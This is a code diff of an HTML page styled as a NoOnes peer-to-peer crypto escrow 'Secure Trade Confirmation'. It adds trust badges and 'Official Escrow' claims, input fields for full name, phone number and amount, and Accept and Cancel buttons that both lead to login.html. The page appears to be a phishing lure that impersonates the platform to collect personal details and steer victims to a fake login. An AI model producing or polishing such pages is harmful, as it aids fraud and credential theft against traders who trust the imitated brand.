@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NoOnes - Trade</title>
+    <title>NoOnes - Secure Trade Confirmation</title>
     <style>
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
@@ -15,8 +15,9 @@
             --card-bg: #ffffff;
             --button-green: #00b36b;
             --button-red: #ef4444;
-            --shadow-color: rgba(0,0,0,0.1);
+            --shadow-color: rgba(0,0,0,0.12);
             --grey: #6b7280;
+            --border: #e5e7eb;
         }
         body.dark {
             --bg-color: #1a1a1a;
@@ -24,8 +25,9 @@
             --card-bg: #222222;
             --button-green: #00d17f;
             --button-red: #f87171;
-            --shadow-color: rgba(255,255,255,0.1);
+            --shadow-color: rgba(255,255,255,0.08);
             --grey: #9ca3af;
+            --border: #374151;
         }
         * { transition: all 0.3s ease; }
         body {
@@ -41,59 +43,94 @@
             animation: fadeIn 0.6s ease-out;
         }
         .wrapper {
-            max-width: 460px;
+            max-width: 480px;
             width: 100%;
-            text-align: center;
         }
         .card {
             background: var(--card-bg);
-            padding: 40px 28px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px var(--shadow-color);
+            padding: 40px 32px;
+            border-radius: 16px;
+            box-shadow: 0 12px 40px var(--shadow-color);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
         }
         .trade-id {
             font-size: 15px;
             color: var(--grey);
-            margin-bottom: 20px;
+            font-weight: 500;
         }
-        .amount {
-            font-size: 32px;
+        .title {
+            font-size: 26px;
             font-weight: 700;
-            color: var(--button-green);
-            margin-bottom: 24px;
+            margin: 8px 0 6px;
+            color: var(--text-color);
         }
-        .details {
+        .subtitle {
+            font-size: 15px;
+            color: var(--grey);
+        }
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0,179,107,0.1);
+            color: var(--button-green);
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 12px;
+        }
+        .form-group {
+            margin-bottom: 20px;
             text-align: left;
-            background: rgba(0,0,0,0.03);
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 32px;
-            font-size: 15.5px;
-            line-height: 1.65;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--grey);
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background-color: var(--card-bg);
+            font-size: 16px;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--button-green);
+            box-shadow: 0 0 0 3px rgba(0,179,107,0.15);
         }
         .warning {
-            font-size: 14px;
+            font-size: 14.5px;
             color: #d97706;
             background: #fef3c7;
-            padding: 14px;
-            border-radius: 6px;
+            padding: 16px;
+            border-radius: 10px;
             margin-bottom: 32px;
             text-align: left;
+            line-height: 1.5;
         }
         .buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
         }
         .btn {
-            padding: 16px 20px;
+            padding: 16px;
             font-size: 17px;
             font-weight: 600;
-            border-radius: 8px;
+            border-radius: 10px;
             border: none;
             cursor: pointer;
             text-decoration: none;
-            display: block;
+            text-align: center;
         }
         .btn-accept {
             background: var(--button-green);
@@ -101,7 +138,7 @@
         }
         .btn-accept:hover {
             filter: brightness(0.95);
-            transform: scale(1.02);
+            transform: translateY(-2px);
         }
         .btn-cancel {
             background: transparent;
@@ -111,8 +148,10 @@
         .btn-cancel:hover {
             background: var(--button-red);
             color: white;
+            transform: translateY(-2px);
         }
         .footer-text {
+            text-align: center;
             margin-top: 40px;
             font-size: 13px;
             color: var(--grey);
@@ -122,26 +161,43 @@
 <body>
     <div class="wrapper">
         <div class="card">
-            <p class="trade-id">Trade #874291 • P2P Escrow</p>
-            <div class="amount">$485.00 USD</div>
-            <div class="details">
-                <p><strong>Buyer:</strong> @crypto_trader_92</p>
-                <p><strong>Payment method:</strong> Bank Transfer (Kenya)</p>
-                <p><strong>Amount to receive:</strong> KES 62,800</p>
-                <p><strong>Time limit:</strong> 30 minutes</p>
-                <p><strong>Trade terms:</strong> Release USDT only after you confirm the full payment has arrived in your bank account.</p>
+            <div class="header">
+                <p class="trade-id">Trade #874291 • P2P Escrow</p>
+                <h1 class="title">Secure Trade Confirmation</h1>
+                <p class="subtitle">Please review and confirm the details below</p>
+                <div class="secure-badge">
+                    🔒 Escrow Protected by NoOnes
+                </div>
             </div>
+
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="name" placeholder="Enter recipient full name">
+            </div>
+
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="text" id="phone" placeholder="Enter phone number">
+            </div>
+
+            <div class="form-group">
+                <label>Amount in USD</label>
+                <input type="text" id="amount" placeholder="e.g. 485.00">
+            </div>
+
             <div class="warning">
-                ⚠️ Only click <strong>Accept Payment</strong> after you have received the full amount in your bank account. 
-                NoOnes holds the crypto in escrow until you confirm.
+                ⚠️ Only click <strong>Accept Payment</strong> after you have received the full amount in your account. 
+                NoOnes holds the funds securely in escrow until both parties confirm.
             </div>
+
             <div class="buttons">
                 <a href="login.html" class="btn btn-accept">Accept Payment</a>
                 <a href="login.html" class="btn btn-cancel">Cancel Trade</a>
             </div>
         </div>
+
         <div class="footer-text">
-            Protected by NoOnes Escrow • Funds are held securely until both parties confirm
+            Protected by NoOnes Official Escrow • All transactions are secure and monitored
         </div>
     </div>
 
